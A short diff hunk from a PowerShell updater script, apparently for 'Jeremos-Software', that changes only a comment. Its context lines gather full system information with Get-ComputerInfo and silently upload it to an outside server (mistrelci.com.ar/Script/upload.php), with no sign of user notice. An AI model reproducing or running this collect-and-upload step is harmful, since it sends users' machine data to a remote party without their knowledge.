@@ -6,7 +6,7 @@ $WebClient = New-Object System.Net.WebClient
 Get-ComputerInfo >> "$env:temp\$env:computername.log"
 (New-Object System.Net.WebClient).UploadFile('https://www.mistrelci.com.ar/Script/upload.php', $env:temp + '\'+ $env:computername + '.log')
 
-#Updating Script
+#Updating Script from 3.1
 if ([decimal](get-content "$PSScriptRoot\version") -eq 2.31){
 # Ubicación del script
 $scriptPath = "$env:windir\Jeremos-Software\run.ps1"
